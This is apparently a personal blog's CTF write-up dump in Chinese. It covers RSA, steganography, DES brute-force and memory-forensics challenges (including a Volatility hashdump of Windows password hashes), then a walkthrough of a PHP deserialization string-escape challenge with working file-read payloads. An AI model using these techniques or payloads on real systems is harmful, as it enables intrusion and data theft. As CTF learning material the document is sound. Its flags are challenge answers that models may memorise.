String: if hashlib.sha256((chr1+chr2+chr3+chr4+behind).encode()).hexdigest()==hashValue: print(chr1+chr2+chr3+chr4) breakpow() flag：flag&#123;f8f0e603-8a2f-4870-b81d-972ab039cfe9&#125; RSAStudy m1：给了c、d、n ==&gt; m=cdmodnm = c^{d} mod nm=cdmodn m2：n太小，直接在线分解出p、q m3：n特别大，e特别小，因为 c=memodnc = m^{e} mod nc=memodn ，me 若没n大可以直接对c开e次方得到m m4：e是20位的素数，直接遍历所有20位的素数，尝试解密，若解密后有不可见字符则跳过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*-coding:utf-8-*-&quot;&quot;&quot;by vvmdx2021/11/28 12:41&quot;&quot;&quot;import gmpy2from Crypto.Util.number import long_to_bytes,bytes_to_longimport gmpy2 as gpdef round1(): n=95845527018839717086294472801605969145676365231323758473521266785720550109591787727210641248040429782803493016018678284969424032513894656011258597991697123040906458428931870959461677035741748707260523109808863069423504777871574127439549082056993303443656505762993233175718191683881904506062498915962417071789 c=2743851142411869248379118038924192049907457070259670722109251021395015205941929560302259759641549680271828782036817328489468187264127325193565012371464631997314398207482280969688296263968695775596468250952244684716979339562706861283018153500950741985494526881474375594286490427451426606421116634452945047605 d=65537 m=pow(c,d,n) return long_to_bytes(m)def round2(): c = 274750938859955592330167122790 n = 1048902211749325097416799151481 p = 974807353794173 q = 1076009744557997 e = 65537 phi=(p-1)*(q-1) d=primefac.modinv(e,phi)%phi m = pow(c, d, n) return long_to_bytes(m)def round3(): n = 18640453489846331794602191747384447703024621993552658501476696307679684008154005802771261130041658000561889540274009131700240237659287434541418323028846854355269787944453313835791228722277309297931161110883060221995194685589684429615817460852313446831810137461857903760896607816014479990108841010359179102028416135867395092471836379674595823743903909119762066042254313890615403656895858669191932404241413414070325709045864882216481803888089008965624519610385223131745453733259902207802062978354791651088711792816246223044537642881905697525313174348622880095283912119417292107480433157927992842659096964533277137708767 c = 13969703385633449917197462425856544850480430207326112090281028915798236467064796479689673052775063674313997314578301227112023113231160584900205532344903858838917789706414684555675461637374321137483769853828107957693180026066461057479661682997954262743 e = 5 m = gp.iroot(c, e)[0] return long_to_bytes(m)def round4(): c = 48550724605239802490802735574619837128533770018799115422170750355571787084837240190282906968166893355816737962546909133079904697609749525658204283046328033928358557965523296167973202608220777994289583796713172282988376178189667994774528015752536586401007481994828159257922229204681186681408471675557339260115 n = 148275690073399102757048819433714926762037969527548279777577605259904188326232564956361831483283388786152723842541087715605543367891265806905933557709191406802930750432995226932444699925443718361381501104621526480808485597229438878264469665328020014789196441181019668546309454418367288885685595286146455127111 p = 12385419895051073291767171828313134764541962212376482960822734800239044848678560002976975547592969326422618567674410577670493481798328745250071880326343129 q = n / p phi = (p-1)*(q-1) e = 2**19 while gp.is_prime(e) != True: e += 1 while e &lt; 2**20: d = gp.invert(e, phi) m = pow(c, d, n) s = long_to_bytes(m) if s[-1:] == b&#x27;&#125;&#x27;: notPrint = 0 for char in s: if ord(char) &lt; 32 or ord(char) &gt; 126: notPrint = 1 break if notPrint == 0: return s e = gp.next_prime(e)if __name__ == &quot;__main__&quot;: flag = round1() + &#x27; &#x27; + round2() + &#x27; &#x27; + round3() + &#x27; &#x27; + round4() print flag flag：flag&#123;if you miss the train I'm on, You will know that I am gone&#125; MISC 签到 flag: flag&#123;welcome_to_xp0int_ctf_2021!!!&#125; guesssssssme 12345678910111213141516171819202122You konw:1GJ411x7h7=80433022=【19v411g7mU=251059264=ANow let&#x27;s go!----------------------1x54y1p7We1ah411r7ar1qy4y147dv1ox411h7JS1yo4y1d7UK1Ms411Q7q71HW411Z7Nm1Ks411a7uU17J411B7a91rW411x7is1NT4y1E7RC1UW411W7K31GW41187mN1mN411Z7tA-----------------------#结果全转换成小写，并包裹flag&#123;&#125; 一开始以为是什么奇怪的编码，拿第一个百度了一下，震惊，居然和某个b站视频bv号一样 思路：这些bv号对应的视频的首字母连起来即为flag 其实也没几个视频，，b站一个个搜就完事了，，不知道谁那么无聊还写了个脚本去爬 bv转av：https://www.zhihu.com/question/381784377/answer/1099438784 爬取网页后正则匹配标题的标签 不过后来发现好像直接用bv也行？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*-coding:utf-8-*-&quot;&quot;&quot;by vvmdx2021/11/22 18:35&quot;&quot;&quot;import requestsimport retable=&#x27;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#x27;tr=&#123;&#125;for i in range(58): tr[table[i]]=is=[11,10,3,8,4,6]xor=177451812add=8728348608def dec(x): r=0 for i in range(6): r+=tr[x[s[i]]]*58**i return (r-add)^xordef enc(x): x=(x^xor)+add r=list(&#x27;BV1 4 1 7 &#x27;) for i in range(6): r[s[i]]=table[x//58**i%58] return &#x27;&#x27;.join(r)bv=[&#x27;1x54y1p7We&#x27;,&#x27;1ah411r7ar&#x27;,&#x27;1qy4y147dv&#x27;,&#x27;1ox411h7JS&#x27;,&#x27;1yo4y1d7UK&#x27;,&#x27;1Ms411Q7q7&#x27;,&#x27;1HW411Z7Nm&#x27;,&#x27;1Ks411a7uU&#x27;,&#x27;17J411B7a9&#x27;, &#x27;1rW411x7is&#x27;,&#x27;1NT4y1E7RC&#x27;,&#x27;1UW411W7K3&#x27;,&#x27;1GW41187mN&#x27;,&#x27;1mN411Z7tA&#x27;]def getBilibili(url): proxies = &#123;&#x27;http&#x27;: &quot;http://localhost:7890&quot;, &quot;https&quot;: &quot;http://localhost:7890&quot;&#125; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27; &#125; res = requests.get(url=url, headers=headers, proxies=proxies) title = re.findall(&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;, res.text) print(title) return titledef getFlag(): url = &#x27;https://www.bilibili.com/video/&#x27; av = [] flag = &#x27;&#x27; for b in bv: flag += getBilibili(url+&#x27;av&#x27; + str(dec(&#x27;BV&#x27;+b)))[0][0] print(&#x27;flag&#123;&#x27; + flag.lower() + &#x27;&#125;&#x27;)if __name__ == &#x27;__main__&#x27;: getFlag() 结果： flag：flag&#123;menggushangdan&#125; fgo 尝试了获取每张小图片的时间戳，结果精度不够，排不了序 不知道怎么做了，好在我有一个破解版ps，有一个性能还算可以的电脑，还有一个快要废了的肝 拼了我3个小时吧，拼的头都裂了，蹲一个官方wp再更新 flag：flag&#123;Fa73-Grand-Ord3r!!&#125; 77777 题目提示led，搜了好久终于搜到相关信息：七段式led显示器/数码管 a~g分别代表一根灯管，不同的组合代表不同的数字，先写个脚本把附件里出现的组合dump出来，写入字典（这里有个坑，文件并不完全是txt，文件头有0xff,0xfe 不知道是什么，反正用winhex去掉就完事了） 123456789101112def LedCode(): with open(&quot;77777.txt&quot;,&#x27;rb&#x27;) as f: a = f.read().split() ledCode = set() for s in a: s = str(s)[2:-1].replace(&#x27;\\\\x00&#x27;,&#x27;&#x27;) if s != &#x27;&#x27;: ledCode.add(s) print(ledCode) # &#123;&#x27;abcdef&#x27;, &#x27;fgcda&#x27;, &#x27;fgbc&#x27;, &#x27;afedcg&#x27;, &#x27;abc&#x27;, &#x27;abcdefg&#x27;, &#x27;afgbcd&#x27;, &#x27;abgcd&#x27;&#125; 接着按照字典，遍历文件，把七段式转换为数字，按每行512个写入文件 12345678910111213141516171819def writeLed(): with open(&quot;77777.txt&quot;,&#x27;rb&#x27;) as f: a = f.read().split() ledArr=[] for s in a: s = str(s)[2:-1].replace(&#x27;\\\\x00&#x27;,&#x27;&#x27;) if s != &#x27;&#x27;: ledArr.append(s) led = &#123;&#x27;afgbcd&#x27;:9,&#x27;fgcda&#x27;:5,&#x27;abcdefg&#x27;:8,&#x27;abcdef&#x27;:0,&#x27;abc&#x27;:7,&#x27;fgbc&#x27;:4,&#x27;abgcd&#x27;:3,&#x27;afedcg&#x27;:6&#125; ledNum=[] f=open(&#x27;led.txt&#x27;,&#x27;w&#x27;) count = 1 for code in ledArr: count += 1 if count % 512 == 0: print(&quot;&quot;, file=f) print(led[code], end=&quot;&quot;, file=f) f.close() 其实到这里已经勉强能看出flag了，不过有的人还是太无聊，写了个脚本把他对比度调高（每个七段式对应一个rgb） 123456789101112color = &#123;&#x27;afgbcd&#x27;:(100,0,0),&#x27;fgcda&#x27;:(100,100,0),&#x27;abcdefg&#x27;:(100,100,100), &#x27;abcdef&#x27;:(100,0,100),&#x27;abc&#x27;:(0,100,100),&#x27;fgbc&#x27;:(0,100,100), &#x27;abgcd&#x27;:(0,100,0),&#x27;afedcg&#x27;:(0,0,0)&#125;def create_img(ledArr): img = np.zeros((69, 512, 3), dtype=np.uint8) ledArr = np.array(ledArr).reshape((69,512)) print(ledArr) for i in range(69): for j in range(512): img[i,j] = color[ledArr[i][j]] cv2.imshow(&quot;img&quot;, img) cv2.waitKey() 执行效果： flag：flag&#123;as5d6-68t2z6-apb33-arg&#125; Eeay_C51 论找软件、画电路图、了解单片机运行原理、找bug整了整整一天，还在奇怪为什么那么多人把这题秒了的时候，发现1.hex文件可以直接反汇编是什么心情… 先用在线仿真画图（u1s1体验不错，国产之光） 但是画完了不懂怎么仿真，找不到地方导入hex文件，搜了一下好像是用来仿真电路，但没办法编译程序？ 后来又找了multisim直接画仿真 然后在板子上导入1.hex文件跑起来，很遗憾，可能是我接线问题（别骂了别骂了）没跑出效果 最后继续搜资料，发现1.hex文件是由写在板子上的c程序编译生成的，我们知道pwn和re用ida反编译的二进制文件也是c编译生成的，，所以就把1.hex丢进ida了 好家伙，直接白学一天单片机白画一天图 flag：flag&#123;Hi_t0_C51&#125; FFIVE win10刷新快捷键：f5，搜索了一下 基本确定是f5隐写 实锤：图片头部有早期f5隐写插入的文本 F5隐写解密工具：https://github.com/matthewgao/F5-steganography 解密：java Extract Xp0int1.jpg （这不得不说我一直以为-p passwd是必须要的参数，试了Xp0int1、123456，还在winhex里仔细的翻有没有把密码写在里面，结果发现其实是可以没有密码的） 解密出output.txt，打开乱码 文件头PK =&gt; zip包格式 =&gt; 改后缀 =&gt; 解压 =&gt; 搜一下，是Brainfuck编码（注：Brainfuck翻译为脑残），找个在线Brainfuck解码 flag：flag&#123;ad45f2-a52f3-ae956ff-ac4b2e&#125; 套娃 套了5000个zip，直接脚本跑 123456789import zipfiledef un_zip(): for i in range(4999, 0, -1): zf = zipfile.ZipFile(&quot;D:\\\\flag\\\\flag&quot; + str(i) + &quot;.zip&quot;) for name in zf.namelist(): zf.extract(name, &quot;D:\\\\flag&quot;)un_zip() 答案在flag0里面 flag：flag&#123;extract_extract_extract_and_4lmost_there~&#125; zero_width 零宽字符，网上很多解析了（解析1、解析2） 打开flag.txt看起来什么都没有，实际上右键看属性或者丢进010或者winhex都能看到有很多东西，下图是vim查看的效果 python脚本解密（试了一些在线解密，都不太正常，这和很多因素有关，建议有本地解密脚本最好用本地解密） 在线解密1、在线解密2、在线解密3、在线解密4 本地脚本github：https://github.com/enodari/zwsp-steg-py 截图好像好一点…因为复制代码的话md里零宽字符会变成一点 flag：flag&#123;98055234-e9e1-4c76-b1b0-fedb03d523ce&#125; boom shakalaka 给的文件提示很明显了，DES加密，CBC工作模式，PAD_PKCS5填充方式，密钥，初始向量都给了，暴破 ? 处的密文即可 1234567892F7B9?2101134780DC5A6584025EBDAA3A182407EB3?11275D3D592808998A5CA556C88DD6228AC53C389?A4B69040A0C7045E8B9F064C89A0F1795232F4AFA17C79F5A784?6A02hint：DESCBC PAD_PKCS5key = &quot;pl2iz!z.&quot;iv = key python暴破脚本（Crypto库好像找不到填充方式的选项？pyDes库就没问题） 1234567891011121314151617181920212223from pyDes import des,PAD_PKCS5,CBC,ECBkey = &#x27;pl2iz!z.&#x27;iv = keycipher = &quot;92F7B9&#123;&#125;2101134780DC5A6584025EBDAA3A182407EB3&#123;&#125;11275D3D592808998A5CA556C88DD6228AC53C389&#123;&#125;A4B69040A0C7045E8B9F064C89A0F1795232F4AFA17C79F5A784&#123;&#125;6A02&quot;hexStr = &#x27;0123456789ABCDEF&#x27;def dec(): obj = des(key, CBC, iv, padmode=PAD_PKCS5) for i in hexStr: for j in hexStr: for k in hexStr: for l in hexStr: try: decStr = obj.decrypt(bytes.fromhex(cipher.format(i, j, k, l))) except: pass else: if decStr[:5] == b&#x27;flag&#123;&#x27; and decStr[-1:] == b&#x27;&#125;&#x27;: print(decStr)dec() 匹配出来找到正常的那个就行了 flag：flag&#123;We_know_that_brute_f0rce_1s_4_go0d_method_to_hack_the_wor1d!!!&#125; EZQIM 量化索引调制水印 1234567891011121314151617181920212223242526clearglobal deltaglobal bdelta=uint8(16);b=uint8(2);lena=imread(&quot;lena.jpg&quot;);% 512*512flag=imread(&quot;flag.jpg&quot;);% 512*80for i=1:80 for j=1:512 if(flag(i,j)&lt;200) flag(i,j)=0; else flag(i,j)=1; end endendwatermarked_lena=reshape(Embed(reshape(lena,1,[]),reshape(flag,1,[])),512,512);imwrite(watermarked_lena,&quot;watermarked_lena.jpg&quot;);function m=Embed(p,s) global delta; global b; m=p; for i=1:length(s) m(i)=uint8((p(i)+delta*s(i))/(b*delta))*b*delta+s(i)*delta; endend matlab没环境也看不懂，，，好在代码不多，找找资料还是能看出在写什么的，用python重写了一遍（应该没错吧） matlab和python还是有点区别的，比如数组下标、cv2读取的通道顺序、numpy reshape的存取顺序都有差，这点费了我好大劲（挺离谱的，学计算机这么久没用过matlab…） 123456789101112131415161718192021222324252627282930import numpy as npfrom numpy import uint8from cv2 import imread,imwritefrom copy import deepcopyimport matplotlib.imagedelta = uint8(16)b = uint8(2)lena=matplotlib.image.imread(&quot;lena.jpg&quot;) # 512*512flag=matplotlib.image.imread(&quot;flag.jpg&quot;) # 512*80# matlab中下标从1开始，python从0开始for i in range(80): for j in range(512): if flag[i][j] &lt; 200: flag[i][j] = 0 else: flag[i][j] = 1def Embed(p, s): m = deepcopy(p) for i in range(len(s)): m[i] = uint8((p[i] + delta * s[i]) / (b * delta)) * b * delta + s[i] * delta return m# matlab的reshape按列存新数据，python按行存，所以python中要设置读取顺序和matlab一样p = np.array(lena).reshape(-1,order=&quot;F&quot;)s = np.array(flag).reshape(-1,order=&quot;F&quot;)watermarked_lena = np.array(Embed(p, s)).reshape((512, 512),order=&quot;F&quot;)imwrite(&quot;watermarked_lena.jpg&quot;, watermarked_lena) 核心代码很简单，读取flag和lena两张图（不是rgb，均为8位灰度值），flag每个像素点的灰度值&gt;=200则置1，小于200置0，用m[i] = uint8((p[i] + delta * s[i]) / (b * delta)) * b * delta + s[i] * delta 改变lena的部分像素点（就是嵌入水印信息的意思），其中p为lena，s为flag根据灰度值映射后的结果，得到最终的水印图 介绍下QIM（Quantization Index Modulation，量化索引调制） QIM算法的主要思想是:根据水印信息, 把原始载体数据用量化器量化到不同的索引区间, 水印检测时则根据调制后的数据所属的量化索引区间来识别水印信息。 太过学术的文章我觉得反而比较难懂…我找了两个博客感觉勉强容易理解一些（博客1、博客2） 用本题的例子来理解就是（做出来后和出题人聊了下，好像我的理解好像还是有偏差？算了反正整出来了）： 每个像素点的灰度值范围是0~255（uint8），其中区间长度（步长）为delta=16，假设0~15为A区间，那么16~31为B区间，32~47为A区间，48~63为B区间…以此类推，将0~255分为A、B交错的两个区间 flag的像素点灰度值大于200置为1，小于200置为0，得到数组s[512][80]，当然后面会reshape为一维的s[512*80] 将lena进行量化：lena[512][512]reshape为一维的p[512*512]；在s的长度（512*80）内，若s[i]为1，则p[i]的像素值修改为⌊(p[i]+16)/32⌋∗32+16\\lfloor(p[i]+16)/32\\rfloor * 32 + 16⌊(p[i]+16)/32⌋∗32+16 ，也即落在A区间（假设），若s[i]为0，则p[i]的像素值修改为⌊(p[i])/32⌋∗32\\lfloor(p[i])/32\\rfloor * 32⌊(p[i])/32⌋∗32，也即落在B区间（与A对应） 因此在我们得到一副水印图时，首先提取出嵌入水印的部分（reshape为一维数组后的前512*80个值），然后根据像素点的灰度值，若灰度值落在A区间（灰度值地板除16模2余1），则s[i]=1，若灰度值落在B区间，则s[i]=0，以此推出水印的信息，最后再给s的0和1赋上足够对比度的值（我用1=&gt;200，0=&gt;50），reshape一下就可以得到水印信息 matlab脚本： 12345678910111213141516171819202122232425262728293031clearglobal deltaglobal bdelta=uint8(16);b=uint8(2);wmlena=imread(&quot;watermarked_lena.jpg&quot;);flag=reshape(zeros(80,512),1,[]);wm=reshape(wmlena,1,[]);tmp=wm;for i=1:length(flag) y=uint8(wm(i)/delta); z=mod(uint8(wm(i)/delta),2); if(mod(uint8(wm(i)/delta),2)==1) flag(i)=0; else flag(i)=1; endendimg=reshape(flag,80,512);for i=1:80 for j=1:512 if(img(i,j)==0) img(i,j)=50; else img(i,j)=200; end endendimg=uint8(img);imwrite(img,&quot;img.jpg&quot;); python脚本： 123456789101112131415161718192021222324252627282930313233343536# -*-coding:utf-8-*-&quot;&quot;&quot;by vvmdx2021/11/27 12:52&quot;&quot;&quot;import numpy as npfrom numpy import uint8import cv2import matplotlib.imagedelta = uint8(16)b = uint8(2)wm_lena = matplotlib.image.imread(&quot;watermarked_lena.jpg&quot;)wm = np.array(wm_lena).reshape(-1,order=&quot;F&quot;)flag = np.zeros((80,512))flag = np.array(flag).reshape(-1)for i in range(len(flag)): if (wm[i]//16)%2 == 1: flag[i] = 0 else: flag[i] = 1flag = np.array(flag).reshape((80,512),order=&quot;F&quot;)for i in range(80): for j in range(512): if flag[i][j] == 1: flag[i][j] = 200 else: flag[i][j] = 50flag = np.array(flag, dtype=np.uint8)cv2.imwrite(&quot;flag.jpg&quot;,flag)cv2.imshow(&quot;flag&quot;,flag)cv2.waitKey() 效果： matlab： python： u1s1python跑不出这个效果（我甚至把区间调的很大才有上图这个效果，如果是16完全看不出来），不知道为什么，懒得找原因了，我电脑没matlab，找了个在线的盲写了一天代码（还是现学的…）一天都在思考怎么用python表达出来，虽然有个smop（github）可以将matlab转python，但是转的很离谱…还不如自己改，结果晚上回宿舍用舍友电脑matlab一下子就跑出来了，麻了（另外吐槽下出题人在flag后面注释了512*80，结果我一直用512行80列的矩阵去读，死活读不出来，最好随便改了下参数变成80*512居然就成了） flag：flag&#123;2a3b-89e-f594&#125; blind 文件反转、图片分离、盲水印 给了一张图和一个压缩包，压缩包打不开，丢winhex里发现文件头和文件尾好像反了 504b0304是zip的文件头 gnp.tuotuo 颠倒一下发现是outout.png 文件反转，脚本直接跑 123with open(&quot;secret.zip&quot;,&#x27;rb&#x27;) as f: with open(&#x27;target.zip&#x27;,&#x27;wb&#x27;) as g: g.write(f.read()[::-1]) 跑出正常的压缩包解压，只有一张outout.png，先放着，看看另一张图secret.png，打开发现有一半是黑的，binwalk看一眼，里面藏了个zip，zip里面还有张1.png 分离，foremost分离后不太对劲，丢到winhex里看，发现他的文件头虽然是对的 但是zip包文件目录区没了，反而是在文件尾发现了文件目录区和正常的文件尾 不太懂什么原因，先mark一下，后期整理整理 分离文件的几个方法试完后 foremost secret.png dd if=secret.png of=1.zip skip=248860 bs=1 binwalk secret.png -e 发现只有binwalk可以，而且还直接把1.png分离出来了，甚至跳过了zip伪加密的考点（应该是吧） 我不理解 难道属于非那么预期？ 搞完后发现其实文件目录区可以不用一定在开头…在上面文件尾部的压缩文件目录区找到伪加密的标志位改掉就正常解压了… 麻了 搞我好多时间，我居然还想着把这段东西剪切到前面… 整完发现1.png和前面的outout.png长得一样，结合题目盲水印没跑了，工具：https://github.com/chishaxie/BlindWaterMark 一键提取python3 bwmforpy3.py decode 1.png outout.png flag.png --oldseed flag：flag{easy_misc}（居然不是ea5y_misc？？？怀疑出题人搞完都忘了自己藏的是什么…） secret u1s1这道题没做出来，很烦，搞了我大半个晚上，不知道怎么找压缩包密码了，蹲一波wp再更新 给了个image.raw文件，搜了一下，应该是内存取证的题 工具：volatility（Kali好想2020开始就不预装这个了） 直接下载linux的可执行文件，然后给文件夹和可执行文件改个名：volatility，增加环境变量export PATH=/mnt/hgfs/Kali_share/misc/volatility:$PATH即可命令行使用 查看系统信息 volatility -f image.raw imageinfo 查看进程列表 volatility -f image.raw --profile=WinXPSP2x86 pslist 关注notepad.exe、7zFM.exe、cmd.exe三个进程 看一下cmd执行过的命令和notepad内容 volatility -f image.raw --profile=WinXPSP2x86 cmdscan 这个好奇怪，什么都没有 volatility -f image.raw --profile=WinXPSP2x86 notepad ~~找到flag了！~~很可惜，并不是这个 对cmdscan的结果感到不满，发现还有其他找cmd的方法 dump出cmd的进程内存 volatility -f image.raw --profile=WinXPSP2x86 memdump -p 528 -D . cmdline看命令行执行了什么 volatility -f image.raw --profile=WinXPSP2x86 cmdline 找到两个可疑文件 查找一下和flag有关的文件 volatility -f image.raw --profile=WinXPSP2x86 filescan|grep flag 把flag.txt dump出来 volatility -f image.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000016fd440 -D . 不知为何dump不出来，可能空文件？没懂 把aha.zipdump出来，并恢复为aha.zip volatility -f image.raw --profile=WinXPSP2x86 filescan|grep aha volatility -f image.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000019f5590 -D . mv file.None.0x815f57f8.dat aha.zip 解压，发现要解压密码，继续找密码 把一些可能有hint的地方找了个遍，，没找到有用的 hashdump看用户密码 123456# volatility -f image.raw --profile=WinXPSP2x86 hashdump Volatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:172b5f482418a719b80c605b8d236dbf:d1e008771f7630fdd3cb50c879d2de9e:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dfedc50699ef5bdda791139eb08901e::: 这几个丢到cmd5里，都不行，一个空密码两个notfound 接着又dump了浏览器进程内存、屏幕截图、ie历史、网络连接历史都没找到有用的…（我不理解 先不搞了，整了大半天…等wp吧","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"2019安洵杯easy_serialize_php","slug":"2021-11-14-2019安洵杯easy_serialize_php","date":"2021-11-13T16:00:00.000Z","updated":"2021-11-30T05:55:05.147Z","comments":true,"path":"2021/11/14/2021-11-14-2019安洵杯easy_serialize_php/","link":"","permalink":"https://vvmdx.github.io/2021/11/14/2021-11-14-2019%E5%AE%89%E6%B4%B5%E6%9D%AFeasy_serialize_php/","excerpt":"先挖个坑再总结一下php反序列化的字符串逃逸…","text":"先挖个坑再总结一下php反序列化的字符串逃逸… 2019安洵杯easy_serialize_php buuoj和xctf都有，但是很离谱的一个开不出环境，一个开了环境访问不了phpinfo。。。不知道是平台的问题还是怎样（后来发现buuoj的除了phpinfo看不了其他都正常，妈的绝了） 最后直接clone了题目的docker自己跑 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 代码审计 GET请求参数f的值 highlight_file: index.php phpinfo: phpinfo() show_image: 把$_SESSION序列化后经过filter过滤，再反序列化，最后打印base64解码后的img属性 img_path: 若存在，则进行base64编码和sha1哈希后赋值给$_SESSION[“img”]；若不存在，则将guest_img.png base64编码后赋值给$_SESSION[“img”] 看一眼phpinfo() 找到一个疑似可能有flag或者hint的页面d0g3_f1ag.php extract($_POST) extract() 函数从数组中将变量导入到当前的符号表。 extract第二个参数用来指定当出现冲突时应该怎么做，默认是EXTR_OVERWRITE 即覆盖变量 若选择EXTR_SKIP，则不覆盖 这道题我们只要知道我们传的数组会覆盖掉原来的值就行了，结合后面分析$_SESSION应该是通过这个地方的POST赋值的 $_SESSION有三个元素 user=guest function=$function 可控 img: 取决于GET的参数 要注意$_SESSION无法直接通过赋值控制，因为unset($_SESSION);会把SESSION销毁 思路 1234else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 这几行是重点 GET传?f=show_image；POST传$\\_SESSION $serialize_info = filter(serialize($_SESSION)); $_SESSION序列化后经过过滤器将一些字符串过滤，然后反序列化后赋给$userinfo $_SESSION -&gt; 序列化 -&gt; 过滤 -&gt; 反序列化 -&gt; $userinfo 打开$_userinfo 的img属性的值经过base64解码后的文件名对应的文件，我们这里选择d0g3_f1ag.php看看里面有什么 反序列化字符串逃逸 关键点在于file_get_contents(base64_decode($userinfo['img']))，如果按照正常的流程，img属性的值为guest_img.png的base64编码，我们需要令其为d0g3_f1ag.php的base64编码。 由于filter过滤器是对序列化后的内容进行过滤，是一种典型的长变短反序列化字符串逃逸 可以看到出现flag的地方都会被替换为空，导致长度不符反序列化出错 如果直接把d0g3_f1ag.php的base64编码直接作为img参数传递的话，会发现img属性的值被替换为guest_img.php 因此我们需要序列化字符串在反序列化时，读取到s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;前，让反序列化结束，同时读取到img=ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php的base64编码） 先随便赋个值尝试一下 发现在没有过滤的情况下多了一个属性 我们知道php反序列化的分隔符为 ;} ，当读到这里时反序列化结束，因此我们需要伪造一个分隔符，在分隔符前构造img=ZDBnM19mMWFnLnBocA==的payload 可以看到灰色部分就是我们需要的内容，接下来就要利用序列化字符串的flag会被过滤的特性让前面的内容作为“值”被覆盖 先简单尝试一下 经过过滤后变为a:2:&#123;s:4:&quot;&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;，可以看到第一个s长度为4，所以读到&quot;;s:就结束了，导致反序列化出错 我们计算出需要覆盖的内容&quot;;s:40:长度为7，刚好flag和php两个被过滤的字符串长度和为7 重新尝试_SESSION[flagphp]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 发现还是不对，这是因为长度7虽然覆盖了那几个字符串，但是他只是把&quot;;s:40:作为属性名而已，还缺少了属性值，因此还要在后面给他加上属性值 继续构造payload，属性值其实就无所谓了，因为不影响前后的构造_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 可以发现终于成功了 把payload丢到buuoj的靶机上，查看源代码即可发现hint 最后一步就把d0g3_f1ag.php的base64编码换为/d0g3_fllllllag的base64编码即可 答案 payload1 _SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; payload2 _SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125; 做的过程还遇到一个小坑：burp2021的重放模块，不知道为什么，post数据没经过url编码的话会导致post错内容 没有url编码的情况 发现值没有被修改 有url编码的情况 值正常修改 这次遇到的是中括号[]引起的，其他符号不知道会不会也这样，搞了好久还一直以为是自己做法有问题，，，直到发现hackbar没问题才意识到是burp的问题 本题测试代码 1234567891011121314151617181920212223242526272829&lt;?phpfunction filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;//$var1 = base64_encode(&#x27;d0g3_f1ag.php&#x27;);$var1 = base64_encode(&#x27;/d0g3_fllllllag&#x27;);//echo $var1;$_SESSION[&#x27;img&#x27;] = $var1;//echo serialize($_SESSION).&quot;&lt;br/&gt;&quot;;//$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;//$_SESSION[&#x27;function&#x27;] = &#x27;show_image&#x27;;//$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);extract($_POST);if(!@$_GET[&quot;img_path&quot;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = 